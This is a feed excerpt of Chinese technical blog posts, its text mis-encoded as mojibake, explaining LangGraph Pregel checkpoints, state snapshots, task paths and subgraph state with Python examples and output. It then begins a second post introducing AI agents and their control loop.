        "bar": "triggered by foo"
    }
}
metadata:
{
    "source": "loop",
    "step": 0,
    "parents": {}
}
parent_config:
{
    "configurable": {
        "thread_id": "123",
        "checkpoint_ns": "",
        "checkpoint_id": "1f0f5200-24ee-671f-bfff-2e9f3ca91778"
    }
}
pending_writes:
[
    [
        "30b17cb1-76f1-3c5a-0d32-33f544fcabdf",
        "nodes",
        [
            "bar2"
        ]
    ],
    [
        "e126d089-c354-0ac8-bb9e-b12bbe3f20b8",
        "__interrupt__",
        "manual interrupt"
    ]
]
</code></pre>
<p>æ´ä¸ªæ§è¡è¿ç¨æ¶åä¸ä¸ªSuperstepï¼ä¼åå»ºä¸¤ä¸ªCheckpointãç¬¬ä¸ä¸ªCheckpointçåå»ºåçå¨è°ç¨invokeæ¹æ³çæ¶åï¼æ­¤æ¶æä¾çè¾å¥è¢«åå¥Channelï¼é¦æ¹å¾æ§è¡çNodeï¼fooï¼åå¤å°±ç»ªï¼æ­¤æ¶åå»ºçCheckpoint è®°å½äº <code>æ¥æ¶å°äºåå§ä»»å¡ï¼ä½å°æªå¼å§æ§è¡ä»»ä½Node</code> çç¶æãæ­¤æ¶å¯¹åºçSuperstepåºå·ä¸º-1ï¼è¾åºç»æçparent_configé¨åæä¾äºæ­¤CheckpointçIDã</p>
<p>ç¬¬äºä¸ªCheckpointæ¯ä¸ºåºå·ä¸º0çSuperstepåå»ºçï¼æ­¤æ¶èç¹fooæåæ§è¡ï¼æ§è¡ç»ææç»è¢«è¾å¥ç®æ Channelï¼åå»ºçCheckpointåæ çå°±æ¯çç¶æï¼configé¨åæä¾äºæ­¤CheckpointçIDãä¸é¢çè¾åºè¿æä¾äºè¿ä¸ªCheckpointçæ¶é´æ³ãChannelççæ¬åå¼ãæ¶åNodeçå¯è§Channelï¼fåçæ¬ï¼ä»¥åæ¶åæ´æ°çChannelåè¡¨ã</p>
<p>ç±äºæåä¸ä¸ªSuperstepï¼åºå·ä¸º1ï¼æ²¡æå®å¨ç»æï¼å®ä»¬ä¼å©ç¨å¯¹åºçPending Writeæ¥æè¿°ãä¸é¢è¾åºçç¬¬ä¸ä¸ªPending Writeè¡¨ç¤ºæåæ§è¡çèç¹baréå¯¹éénodesçåå¥ï¼ç¬¬äºä¸ªéå¯¹ç¹æ®ç³»ç»Channel <code>__interrupt__</code>çåå¥å¾ææ¾å°±æ¯å ä¸ºèç¹bar1çä¸­æ­å¯¼è´ã</p>
<h2 id="2-è¯»åç¶æå¿«ç§">2. è¯»åç¶æå¿«ç§</h2>
<p>BaseCheckpointSaveræä¾äºget_tuple/aget_tupleæ¹æ³ä»¥Checkpoint_Tupleçå½¢å¼è¿åææ°æèåºäºè¿å»æ¶é´ç¹çç¶æãå¯¹äºCheckpointTupleè¿ä¸ªäºåç»ï¼é¤äºCheckpointåPendingWriteåè¡¨ï¼è¿åæ¬Checkpointçåæ°æ®åç¸å³éç½®ãè¿ä¸ªåç»ä¸»è¦ç±æ§è¡å¼æåé¨ä½¿ç¨çï¼éå¯¹æç»å¼åèæ¥è¯´å¯è¯»æ§å·®ç¹ï¼æä»¥Pregelç±»å®ä¹äºå¦ä¸æç¤ºç<code>get_state/aget_state</code>æ¹æ³ï¼å®ä»¬æä¾çStateSnapshotç±»åæ´å·å¯è¯»æ§ã</p>
<pre><code class="language-python">class Pregel(
    PregelProtocol[StateT, ContextT, InputT, OutputT],
    Generic[StateT, ContextT, InputT, OutputT]): 

    def get_state(
        self, config: RunnableConfig, *, subgraphs: bool = False
    ) -&gt; StateSnapshot
    async def aget_state(
        self, config: RunnableConfig, *, subgraphs: bool = False
    ) -&gt; StateSnapshot

    def get_state_history(
        self,
        config: RunnableConfig,
        *,
        filter: dict[str, Any] | None = None,
        before: RunnableConfig | None = None,
        limit: int | None = None,
    ) -&gt; Iterator[StateSnapshot]
    async def aget_state_history(
        self,
        config: RunnableConfig,
        *,
        filter: dict[str, Any] | None = None,
        before: RunnableConfig | None = None,
        limit: int | None = None,
    ) -&gt; AsyncIterator[StateSnapshot]
</code></pre>
<p>å½æä»¬è°ç¨Pregelå¯¹è±¡ç<code>get_state/aget_state</code>æ¹æ³çæ¶åï¼å®ä¼å°æå®çRunnableConfigå¯¹è±¡ä½ä¸ºåæ°è°ç¨Checkpointerç<code>get_tuple/aget_tuple</code>æ¹æ³ï¼å¹¶å©ç¨è¿åçCheckpoint_Tupleåç»çæStateSnapshotå¯¹è±¡ãStateSnapshotç<code>values</code>å­æ®µæä¾çå¼æ¥æºäºCheckpointå¯¹è±¡çchannel_valueså­æ®µï¼å®ç<code>metadata</code>å­æ®µè¡¨ç¤ºçCheckpointMetadata ç´æ¥æ¥æºäºCheckpoint_Tupleçååå­æ®µï¼è<code>config</code>å<code>parent_config</code>è¿åçRunnableConfigåæ¯ç±Checkpoint_Tupleååå­æ®µäºåæ°æ®åå¹¶èæãè¡¨ç¤ºå¿«ç§åå»ºæ¶é´ç<code>created_at</code>å¯¹åºäºCheckpoint_Tupleè¡¨ç¤ºæ¶é´æ³çtså­æ®µï¼èinterruptsè¿åçInterruptåè¡¨æ¯æ ¹æ®ä¸­æ­ç±»åçPendingWriteæå»ºçã</p>
<pre><code class="language-python">class StateSnapshot(NamedTuple):
    values: dict[str, Any] | Any
    next: tuple[str, ...]
    config: RunnableConfig
    metadata: CheckpointMetadata | None
    created_at: str | None
    parent_config: RunnableConfig | None
    tasks: tuple[PregelTask, ...]
    interrupts: tuple[Interrupt, ...]

class PregelTask(NamedTuple):
    id: str
    name: str
    path: tuple[str | int | tuple, ...]
    error: Exception | None = None
    interrupts: tuple[Interrupt, ...] = ()
    state: None | RunnableConfig | StateSnapshot = None
    result: Any | None = None
</code></pre>
<p>StateSnapshotç<code>tasks</code>å­æ®µè¿åä¸ç»PregelTaskå¯¹è±¡ï¼å®ä»¬è¡¨ç¤ºæ ¹æ®Checkpointåå»ºçå¾æ§è¡ä»»å¡ï¼<code>next</code>å­æ®µä»¥åç»çå½¢å¼è¿åè¿äºä»»å¡çNodeåç§°ãå¯¹äºææ°çCheckpointï¼è¥ä¸ä¸ä¸ªSuperstepå°æªå®æï¼PregelTaskçä¿¡æ¯è¿ä¼å©ç¨å¯¹åºçPending Writeè¿ä¸æ­¥å®åãæä»¬å¯ä»¥å©ç¨PregelTaskå¯¹è±¡å¾å°æ¯ä¸ªä»»å¡çIDãNodeåç§°ãæ§è¡è·¯å¾ãæåºçå¼å¸¸åä¸­æ­ï¼æ ¹æ®å¼å¸¸åä¸­æ­ç±»åçPendingWriteåå»ºï¼ï¼è<code>state</code>å<code>result</code>åå«æ¿è½½è¿ä»»å¡çç¶æåè¾åºç»æãå¦ææ´ä¸ªæ§è¡æµç¨ç»æï¼èªç¶å°±æ²¡ææè°åç»­ä»»å¡çè¯´æ³ï¼æ­¤æ¶StateSnapshotçtaskså­æ®µä¸ºç©ºã</p>
<p>é¤äºè¿åä¸ä¸ªå·ä½çç¶æå¿«ç§ï¼Pregelç±»è¿å®ä¹äº<code>get_state_history/aget_state_history</code>ï¼å®ä»¬çåæ°åè¡¨ä¸BaseCheckpointSaverç<code>list/alist</code>æ¹æ³å®å¨ä¸è´ãå½è¿ä¸¤ä¸ªæ¹æ³è¢«è°ç¨çæ¶åï¼Pregelä¼è°ç¨Checkpointerç<code>list/alist</code>æ¹æ³ï¼å¹¶å°å¾å°Checkpoint_Tupleåç»è½¬æ¢æStateSnapshotå¯¹è±¡ã<code>get_state_history/aget_state_history</code>æ¹æ³è¿åçè¿­ä»£å¨ä»¥æ¶é´éåºçæ¹å¼è¿åå¯¹åºçç¶æå¿«ç§ã</p>
<p>å¦ä¸è¿ä¸ªç¨åºæ¼ç¤ºäºä¸ä¸ªå·ä½çPregelå¯¹è±¡çåå²ç±åªäºå¿«ç§ç»æï¼æ¯ä¸ªå¿«ç§ååæ å½æ¶çç¶æãæä»¬æå»ºçPregelå¯¹è±¡ç±åä¸ªNodeç»æï¼è°ç¨æ¶æå®ééfooä¼é©±å¨æ§è¡èç¹fooï¼å®æ§è¡ç»æååå¥éébaré©±å¨bar1ãbar2åbar3å¹¶è¡æ§è¡ãé¤äºbar1è½å¤é¡ºå©æ§è¡å¤ï¼æä»¬ä¸ºbar2è®¾ç½®äºä¸ä¸ªä¸­æ­ï¼è®©bar3æåºå¼å¸¸ã</p>
<pre><code class="language-python">from langgraph.channels import LastValue
from langgraph.pregel import Pregel, NodeBuilder
from langgraph.checkpoint.memory import  InMemorySaver
from langgraph.types import interrupt
    
def handle(node_name: str, halt : bool, raise_error: bool) -&gt; None:
    if halt:
        _ = interrupt(f"Manually be interrupted at {node_name}")
    if raise_error:
        raise Exception(f"Manually raised error at {node_name}")

foo = (NodeBuilder()
       .subscribe_to("foo", read=False)
       .do(lambda _: handle("foo", halt=False, raise_error=False))
       .write_to(bar = lambda _:None))
bar1 = (NodeBuilder()
        .subscribe_to("bar", read=False)
        .do(lambda _: handle("bar1", halt=False, raise_error=False)))
bar2 = (NodeBuilder()
        .subscribe_to("bar", read=False)
        .do(lambda _: handle("bar2", halt=True, raise_error=False)))
bar3 = (NodeBuilder()
        .subscribe_to("bar", read=False)
        .do(lambda _: handle("bar3", halt=False, raise_error=True)))
app = Pregel(
    nodes={
        "foo": foo,
        "bar1": bar1,
        "bar2": bar2,
        "bar3": bar3
    },
    channels={
        "foo": LastValue(str),
        "bar": LastValue(str),
    },
    input_channels=["foo"],
    output_channels=[],
    checkpointer= InMemorySaver())
config = {"configurable": {"thread_id": "123"}}

try:
    app.invoke(input={"foo": "begin"},config=config)
except Exception as e:
    pass

for snapshot in app.get_state_history(config):
    print(f"""
values: {snapshot.values}
next: {snapshot.next}
interrupts: {snapshot.interrupts}   
tasks:""")
    for task in snapshot.tasks:
        print(f"""  id: {task.id}
    name: {task.name}
    path: {task.path}
    error: {task.error} 
    interrupts: {task.interrupts}
    state: {task.state}
    result: {task.result}""")
</code></pre>
<p>å¨å®æäºéå¯¹Pregelå¯¹è±¡çè°ç¨åï¼æä»¬éç¨ç¸åçéç½®è°ç¨å®ç<code>get_state_history</code>æ¹æ³å¾å°å®æ´çåå²ï¼å¹¶å°æ¿è½½åå²çæ®µçStateSnapshotä¿¡æ¯æå°åºæ¥ãæ´ä¸ªè¿ç¨æ¶åä¸ä¸ªSuperstepï¼åä¸¤ä¸ªæåå®æçSuperstepä¼æä¾ä¸¤ä¸ªCheckpointï¼ç¬¬ä¸ä¸ªå°æªå®æçSuperstepåªæä¾éå¯¹ä¸ä¸ªNodeä»»å¡çPending Writeã</p>
<pre><code class="language-json">values: {'start': 'begin', 'bar': None}
next: ('bar1', 'bar2', 'bar3')
interrupts: (Interrupt(value='Manually be interrupted at bar2', 
    id='26f309d618c42ff31d2b3404369232e4'),)
tasks:
  id: dbb24ec5-f1ba-f845-7351-54e88f34db0f
    name: bar1
    path: ('__pregel_pull', 'bar1')
    error: None
    interrupts: ()
    state: None
    result: {}
  id: 794fffda-2e6c-0685-0d44-3ed6c57ca366
    name: bar2
    path: ('__pregel_pull', 'bar2')
    error: None
    interrupts: (Interrupt(value='Manually be interrupted at bar2', 
        id='26f309d618c42ff31d2b3404369232e4'),)
    state: None
    result: None
  id: 1055ec55-49dc-0629-86b5-661a2614f349
    name: bar3
    path: ('__pregel_pull', 'bar3')
    error: Exception('Manually raised error at bar3')
    interrupts: ()
    state: None
    result: None

values: {'start': 'begin'}
next: ('foo',)
interrupts: ()
tasks:
  id: 88904475-3edc-733a-d84d-98aa6d3f5e80
    name: foo
    path: ('__pregel_pull', 'foo')
    error: None
    interrupts: ()
    state: None
    result: {'bar': None}
</code></pre>
<h2 id="3ä»»å¡è·¯å¾">3.ä»»å¡è·¯å¾</h2>
<p>è¿è®°å¾æä»¬åé¢è¯´ä¸ªä»»å¡çä¸¤ç§åå»ºæ¹å¼ï¼ä¸ç§æ¯ç«å¨Nodeçè§åº¦ï¼éè¿æ¥çè®¢éChannelçæ´æ°ç¶æç¡®å®æ¯å¦åºè¯¥æ§è¡ï¼æä»¬ç§°è¿ç§ä»»å¡åå»ºæ¨¡å¼ä¸º<code>Pullæ¨¡å¼</code>ãä¸ä¹ç¸å¯¹çåæ¯<code>Pushæ¨¡å¼</code>ï¼Nodeå©ç¨åå¥<code>__pregel_tasks</code>è¿ä¸ªç¹æ®ChannelçSendå¯¹è±¡å³å®åç»­æ§è¡çNodeï¼æ§è¡å¼æä¼ä»æ­¤Channelè¯»åSendå¯¹è±¡çæ¥åå»ºå¯¹åºçä»»å¡ãä»»å¡è·¯å¾çç¬¬ä¸é¨åéå¸¸å°±åæ äºä»»å¡çé©±å¨æ¨¡å¼ï¼å¯¹åºçå¼ä¸º<code>__pregel_pull</code>å<code>__pregel_push</code>ã</p>
<p>ç±äºåé¢æ¼ç¤ºçé½æ¯åºäºChannelè®¢éé©±å¨çä»»å¡ï¼æä»¥è·¯å¾éç¨(â__pregel_pullâ,{node})çå½¢å¼ãå¦ä¸çç¨åºæ¼ç¤ºâPushä»»å¡âçè·¯å¾ï¼æä»¬æå»ºçPregelç±åä¸ªNodeï¼fooãbar1ãbar2åbar3ï¼ç»æï¼èç¹fooçå¤çå½æ°æç»ä¼çæä¸ä¸ªéå¯¹å¶ä»NodeçSendå¯¹è±¡ï¼å¹¶åå¥â__pregel_tasksâChannelä»¥é©±å¨å®ä»¬å¹¶è¡æ§è¡ã</p>
<pre><code class="language-python">from langgraph.pregel import Pregel, NodeBuilder
from langgraph.channels import LastValue
from langgraph.pregel._read import PregelNode
from langgraph.pregel._write import ChannelWrite, ChannelWriteTupleEntry
from langgraph.types import Send
from langgraph.checkpoint.memory import InMemorySaver

entry = ChannelWriteTupleEntry(lambda args: [("__pregel_tasks", args)])
writer = ChannelWrite(writes=[entry])
foo: PregelNode = (
    NodeBuilder()
    .subscribe_to("foo")
    .do(lambda _: [Send(node=node, arg="foo") for node in ["bar1", "bar2", "bar3"]])
).build()
foo.writers.append(writer)

bars = {name: NodeBuilder() for name in ["bar1", "bar2", "bar3"]}

app = Pregel(
    nodes={"foo": foo, **bars},
    channels={
        "foo": LastValue(None),
    },
    input_channels=["foo"],
    output_channels=[],
    checkpointer=InMemorySaver(),
)

config = {"configurable": {"thread_id": "123"}}
result = app.invoke(input={"foo": None}, config=config, interrupt_before="bar2")
snapshot = app.get_state(config)
for task in snapshot.tasks:
    print(f"{task.name}:{task.path}")
</code></pre>
<p>ä¸ºäºè½çå°ä¸ä¸ªä»»å¡ï¼æä»¬å¨å¨æåä¸ä¸ªSuperstepä¸­äº§çä¸ä¸ªä¸­æ­ï¼ä¸ºæ­¤æä»¬å¨è°ç¨çæ¶åéè¿æå®<code>interrupt_before</code>åæ°å¨æ§è¡èç¹bar2åä¸­æ­ãæä»¬éåè°ç¨Pregelçget_stateæ¹æ³å¾å°æè¿°æç»ç¶æçStateSnapshotï¼å¹¶è¾åºææä»»å¡çæ§è¡è·¯å¾ãä»å¦ä¸çè¾åºå¯ä»¥çåºï¼ç±äºæ¯ä¸ä¸ªåºäºPushæ¨¡å¼çä»»å¡ï¼æä»¥ç»æè·¯å¾çç¬¬ä¸ä¸ªé¨ååå®¹ä¸º <code>__pregel_push</code> ãæ¯ä¸ªä»»å¡ç± <code>__pregel_tasks</code> ChannelçSendå¯¹è±¡æå»ºèæï¼ç¬¬äºé¨åçæ°ç»ä»£è¡¨å¯¹åºçSendå¯¹è±¡å¨Channelä¸­çç´¢å¼ãç±äºæ´ä¸ªç¨åºåªæå¯ä¸çPregelå¯¹è±¡ï¼ä¸è®¾ç½®å­å¾è°ç¨ï¼æä»¥ç¬¬ä¸é¨åè¿åFalseã</p>
<pre><code>bar1:('__pregel_push', 0, False)
bar2:('__pregel_push', 1, False)
bar3:('__pregel_push', 2, False)
</code></pre>
<h2 id="4ç¶æåµå¥">4.ç¶æåµå¥</h2>
<p>è¿éæä»¬æå¿è¦æä¸ä¸PregelTaskç±»ç<code>state</code>å­æ®µãä»ç»åºçå®ä¹å¯ä»¥çåºï¼å®å¯ä»¥è¿åä¸ä¸ªRunnableConfigéç½®ï¼ä¹å¯ä»¥è¿åä¸ä¸ªStateSnapshotå¯¹è±¡ãå¦æä»»å¡æ¶åå­å¾çè°ç¨ï¼å¹¶ä¸å¨è°ç¨get_state/aget_stateæ¹æ³æ¶å°subgraphsåæ°è®¾ç½®ä¸ºTrueï¼å®çstateå­æ®µå°±ä¼è¿åä¸ä¸ªæè¿°å­å¾å½åç¶æç<code>StateSnapshot</code>å¯¹è±¡ãåå©äºåæ æ§è¡é¾è·¯åè°ç¨é¡ºåºçCheckpointå½åç©ºé´ï¼å°±å¯ä»¥å½¢æçåµå¥å±æ¬¡ç»æï¼state =&gt;task=&gt;stateï¼ä½¿æä»¬å¯ä»¥å¯ä»¥çå°ä¸ä¸ªä»»å¡å®æ´çè°ç¨é¾æ¡ã</p>
<p><img alt="Alternative Text" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3765958/202602/3765958-20260219075836401-630441833.png" class="lazyload"></p>
<p>ä»¥å¦ä¸è¿ä¸ªéªè¯ç¨åºä¸ºä¾ãæä»¬æå»ºäºä¸¤ä¸ªå·æåä¸NodeçPregelå¯¹è±¡appåsub_graphï¼åèçèç¹main_nodeä»¥å­å¾è°ç¨çæ¹å¼è°ç¨sub_graphï¼åèçNodeå½åä¸º âsub_nodeâãä¸ºäºå¨StateSnapshotä¸­å°ä»»å¡ä¿çä¸æ¥ï¼æä»¬å¨ä¸¤ä¸ªNodeä¸­å¼å¥äºä¸­æ­ã</p>
<pre><code class="language-python">from langgraph.pregel import Pregel, NodeBuilder
from langgraph.channels import LastValue
from langgraph.checkpoint.memory import InMemorySaver
from langgraph.types import interrupt
from typing import Any
from langgraph.types import StateSnapshot

sub_node = (NodeBuilder()
    .subscribe_to("start")
    .do(lambda _: interrupt("manual interrupt"))
)
sub_graph = Pregel(
    nodes={"sub_node": sub_node},
    channels={"start": LastValue(str)},
    input_channels=["start"],
    output_channels=[],
)

def handle(args: dict[str, Any]) -&gt; None:
    sub_graph.invoke(input={"start": "begin"})
    interrupt("main graph interrupt")

main_node = NodeBuilder().subscribe_to("start").do(handle)
app = Pregel(
    nodes={"main_node": main_node},
    channels={"start": LastValue(str)},
    input_channels=["start"],
    output_channels=[],
    checkpointer=InMemorySaver())

config = {"configurable": {"thread_id": "123"}}
app.invoke(input={"start": "begin"}, config=config)
snapshot = app.get_state(config, subgraphs=True)

indent = -1
def print_snapshot(snapshot: StateSnapshot) -&gt; None:
    global indent
    indent += 1
    config = snapshot.config["configurable"]
    print(f"{'  ' * indent}checkpoint_ns: {config.get('checkpoint_ns', None)}")
    for task in snapshot.tasks:
        print(f"{'  ' * indent}task: {task.name}:{task.id}")
        if sub_snapshot := task.state:
            print_snapshot(sub_snapshot)

print_snapshot(snapshot)
</code></pre>
<p>å¨å®æè°ç¨åï¼æä»¬è°ç¨ä½ä¸ºä¸»å¾çPregelå¯¹è±¡ç<code>get_state</code>æ¹æ³ï¼å¹¶å°åæ°subgraphsè®¾ç½®ä¸ºTrueãæä»¬è°ç¨print_snapshotå½æ°è¾åºStateSnapshotæä¾çCheckpointå½åç©ºé´åä»»å¡çåç§°ä¸IDãå¦ææè¿°ä»»å¡çPregelTaskå¯¹è±¡çstateå­æ®µä¹æ¯ä¸ä¸ªStateSnapshotå¯¹è±¡ï¼é£ä¹ç»§ç»­éå½è°ç¨æ­¤å½æ°ãä»å¦ä¸çè¾åºå¯ä»¥çåºï¼ä½ä¸ºå­å¾çPregelå°å½åä»»å¡çåç§°åIDçç»åä½ä¸ºCheckpointå½åç©ºé´ï¼è¿æ ·çç»æç¡®ä¿äº âä¸»å¾â æ¢å¤çæ¶åè½å¤ç²¾åå°å è½½ âå­å¾â çç¶æã</p>
<pre><code>checkpoint_ns: 
task: main_node:9f7c900b-0d56-927c-17fb-5d519cc85678
    checkpoint_ns: main_node:9f7c900b-0d56-927c-17fb-5d519cc85678
    task: sub_node:a483bfb8-bcc6-92b3-2f64-9f9e9f4fe158
</code></pre>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-19 07:59">2026-02-19 07:58</span>&nbsp;
<a href="https://www.cnblogs.com/jaydenai">JaydenAI</a>&nbsp;
éè¯»(<span id="post_view_count">9</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19623976);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19623976', targetLink: 'https://www.cnblogs.com/jaydenai/p/19623976/read-state', title: '[æè§£LangChainæ§è¡å¼æ]æä¹åç¶æçæå' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ AI å­¦ä¹ ç¬è®°ï¼Agent çåºç¡åºç¨ ]]></title>
    <link>https://www.cnblogs.com/owlman/p/19623216</link>
    <guid>3ab4031921348db14bb19443c10ebff8</guid>
    <description>
    <![CDATA[ 
        <h2 class="post-title">
            <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/owlman/p/19623216" title="åå¸äº 2026-02-18 16:09">
    <span role="heading" aria-level="2">AI å­¦ä¹ ç¬è®°ï¼Agent çåºç¡åºç¨</span>
    

</a>

        </h2>
        <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<blockquote>
<p>[!NOTE] ç¬è®°è¯´æ</p>
<p>è¿ç¯ç¬è®°å¯¹åºçæ¯ã[[å³äº AI çå­¦ä¹ è·¯çº¿å¾]]ãä¸æä¸­æè§åçç¬¬åä¸ªå­¦ä¹ é¶æ®µãå¶ä¸­è®°å½äºæå­¦ä¹  AI Agent çå·¥ä½åçï¼å¹¶å°å¶åºç¨äºå®éå·¥ä½åºæ¯çå¨è¿ç¨ï¼ä»¥åå¨è¯¥è¿ç¨ä¸­æè·å¾çå¿å¾ä½ä¼ãåæ ·çï¼è¿äºåå®¹ä¹å°æä¸ºæ AI ç³»åç¬è®°çä¸é¨åï¼è¢«å­å¨å¨æ¬äºº Github ä¸ç<a href="https://github.com/owlman/CS_StudyNotes" target="_blank" rel="noopener nofollow">è®¡ç®æºå­¦ä¹ ç¬è®°åº</a>ä¸­ï¼å¹¶äºä»¥é¿æç»´æ¤ã</p>
</blockquote>
<h2 id="ai-agent-ç®ä»">AI Agent ç®ä»</h2>
<p>å¨çè§£äº LLM å¨çäº§ç¯å¢ä¸­ææ®æ¼çè§è²ä¹åï¼åå­¦èä»¬æ¥ä¸æ¥è¦æèçé®é¢æ¯ï¼å¦ä½è®©å®åä¸å°èªå·±çå®éå·¥ä½ä¸­ï¼å°ç®åä¸ºæ­¢ï¼æªè³ 2026 å¹´ 2 æï¼ï¼è¿ä¸ªé®é¢æå·å¯è¡æ§çè§£å³æ¹æ¡æ¯ï¼æå»ºå¹¶ä½¿ç¨ AI Agentã</p>
<h3 id="ä¸ºä»ä¹éè¦-ai-agent">ä¸ºä»ä¹éè¦ AI Agent</h3>
<p>å¨æ©æï¼å¤§å¤æ°ç¨æ·æ¯éè¿ Web ç«¯æç§»å¨ç«¯çå³æ¶éä¿¡åºç¨ï¼ä¸»è¦ä»¥ææ¬èå¤©çæ¹å¼æ¥ä½¿ç¨ LLM çï¼ä¾å¦ ChatGPTãè±åç­ï¼ãè¿ç±»åºç¨æ¬è´¨ä¸æ¯åºäº HTTP API æå»ºçäººæºäº¤äºçé¢ï¼å¶ä¸»è¦äº¤äºæ¨¡å¼æ¯âè¾å¥ææ¬âçæææ¬âçå¾è¿è¿ç¨ãæä»¬ä¹åå¨ã[[LLM çé¨ç½²ä¸æµè¯]]ãä¸æä¸­åºäº PyTest æ¡æ¶ç¼åçæµè¯ç¨ä¾ï¼å®éä¸æ¨¡æçå°±æ¯è¿ç§äº¤äºæ¨¡å¼ã</p>
<p>å°½ç®¡ï¼è¿ç±»åºç¨æå¤§å°éä½äº LLM çä½¿ç¨é¨æ§ï¼ä½¿å¶æä¸ºäºä¸ç§è½æ åæ®éç¨æ·çæºè½é®ç­å·¥å·ï¼ä½ AI æè½å¸¦æ¥ççäº§åä¹å¨å¾å¤§ç¨åº¦ä¸è¢«å±éå¨äºè¿ç§å³æ¶éä¿¡å¼çäº¤äºæ¨¡å¼ä¸­ãå ä¸ºå¨è¿ç§äº¤äºæ¨¡å¼ä¸ï¼LLM åªè½æ ¹æ®ç¨æ·å½åçè¾å¥æ¥çæææ¬ç»æï¼æ æ³ä¸»å¨è®¿é®æ¬å°ç¯å¢ãè°ç¨ç³»ç»èµæºææ§è¡å®éä»»å¡ãæ´éè¦çæ¯ï¼LLM å¨è¿ç§æ¨¡å¼ä¸å¹¶ä¸å¤äºä¸ä¸ªæç»­è¿è¡çæ§å¶ç»æä¹ä¸­ï¼å®åªå¨æ¶å°è¯·æ±æ¶ååºä¸æ¬¡æ§ååºï¼æ æ³è´è´£å·ä½çå·¥ä½æµç¨ä¸ç¶æç®¡çã</p>
<p>è¯æ³ä¸ä¸ï¼å¦æ LLM å·²ç»å·å¤äºå¤æçä»»å¡è§åä¸æ§è¡è½åï¼æä»¬å´æå®éå¶å¨èå¤©çªå£ä¸­ï¼è¿å²ä¸æ¯å¤ªæµªè´¹äºï¼æ­£æ¯ä¸ºäºé¿åè¿ç§æµªè´¹ï¼å¹¶èµäº LLM å¨ç¹å®ç¯å¢ä¸­âæ§è¡æä½âçè½åï¼AI çç ç©¶èä»¬éæ°å®¡è§äº AI Agent è¿ä¸å¨ 20 ä¸çºª 80-90 å¹´ä»£å°±å·²ç»å½¢æä½ç³»çæ¦å¿µï¼å¹¶å¨å·¥ç¨å®è·µé¢åç»äºå®å¨æ°çå®ç°å½¢å¼ã</p>
<p>å³äº AI Agent è¿ä¸ªæ¦å¿µï¼è¯»èå¯ä»¥åèæä¹åå¨ã[[å³äº AI çå­¦ä¹ è·¯çº¿å¾]]ãä¸­æ¨èçãäººå·¥æºè½ï¼ç°ä»£æ¹æ³ãä¸ä¹¦ç»åºçå®ä¹ï¼åæå¦ä¸ï¼</p>
<blockquote>
<p>An agent is anything that can perceive its environment through sensors and act upon that environment through actuators.</p>
<p>ç¿»è¯è¿æ¥å°±æ¯ï¼</p>
<p>ä»»ä½è½å¤éè¿ä¼ æå¨æç¥ç¯å¢ï¼å¹¶éè¿æ§è¡å¨å¯¹ç¯å¢äº§çå½±åçå®ä½ï¼é½å¯ä»¥ç§°ä¸º Agentã</p>
</blockquote>
<p>è¿ä¸ªå®ä¹æä¸ºäºåæ¥ææ AI Agent åºç¨ççè®ºåºç¡ãç±æ­¤ä¹å¯ä»¥çåºï¼AI Agent çæ ¸å¿åè½å¹¶ä¸æ¯æå LLM æ¬èº«çæºè½æ°´å¹³ï¼èæ¯èµäºå®ä¸å¤é¨ç³»ç»äº¤äºçè½åï¼ä½¿å¶è½å¤åä¸å°çå®çå·¥ä½æµç¨ä¹ä¸­ãä»æ¬è´¨ä¸æ¥è¯´ï¼è¿å¶å®æ¯ AI åºç¨å¨å®¢æ·ç«¯æ¹é¢çä¸æ¬¡è§è²è½¬åï¼å®ç°å¨ä»åçº¯çç­é¢å·¥å·è¢«è½¬åæäºä¸ä¸ªå¯ä»¥åä¸ä»»å¡æ§è¡çç³»ç»ç»ä»¶ãå¨ç¹å®çåºç¨åºæ¯ä¸­ï¼è¿ç§æ¶æä¸çè½¬åä¸ºå·¥ä½æµç¨çèªå¨åæä¾äºå¯è¡çå·¥ç¨è·¯å¾ã</p>
<h3 id="ai-agent-çå·¥ä½åç">AI Agent çå·¥ä½åç</h3>
<p>ä¸é¢ï¼è®©æä»¬æ¥äºè§£ä¸ä¸ AI Agent å·ä½æ¯æä¹å·¥ä½çãå¨ä¼ ç»èå¤©å¼ç AI åºç¨ä¸­ï¼æä»¬å¯ä»¥å°å¶åºæ¬çæ§è¡æ¨¡å¼ç®åæ¦æ¬ä¸ºï¼</p>
<blockquote>
<p>ç¨æ·è¾å¥ â æ¨¡åæ¨ç â è¾åºç»æ â ç»æ</p>
</blockquote>
<p>è¿ç§æ§è¡æ¨¡å¼æ¬è´¨ä¸æ¯ä¸æ¬¡æ§çè¯·æ±âååºï¼request-responseï¼ç»æãå³å¨è¿ç§æ§è¡æ¨¡å¼ä¸ï¼LLM ä¼å¨æ¥æ¶å°ç¨æ·è¾å¥åçæææ¬ï¼ç¶åå°±ç«å³éåºå½åå·¥ä½æµç¨ï¼ä¸ååä¸åç»­ç¶æç®¡çäºãAI Agent ä¸è¿ç±»åºç¨çæ ¸å¿å·®å¼å°±å¨äºï¼å®å¨æ§è¡æ¨¡å¼ä¸­å¼å¥äºä¸ä¸ªå¯æç»­è¿è¡çæ§å¶å¾ªç¯ï¼control loopï¼ãè¿ç§å¾ªç¯ç»æå° LLM ä»è¢«å¨æ¥æ¶ç¨æ·è¾å¥çææ¬çæå¨ï¼è½¬åæäºç¨äºé©±å¨æ´ä¸ªç¨åºæ§è¡ç»æçå³ç­ç»ä»¶ãæ¢è¨ä¹ï¼Agent çå­å¨å° AI åºç¨çåºæ¬æ§è¡æ¨¡å¼ä»âè¯·æ±âååºâè½¬åæäºä¸é¢è¿æ ·ä¸ä¸ªâæç¥âå³ç­âæ§è¡âçå¾ªç¯ç»æï¼</p>
<blockquote>
<p>æç¥ç¯å¢ â çæå³ç­ â æ§è¡å¨ä½ â æ´æ°ç¯å¢ç¶æ â åæ¬¡æç¥</p>
</blockquote>
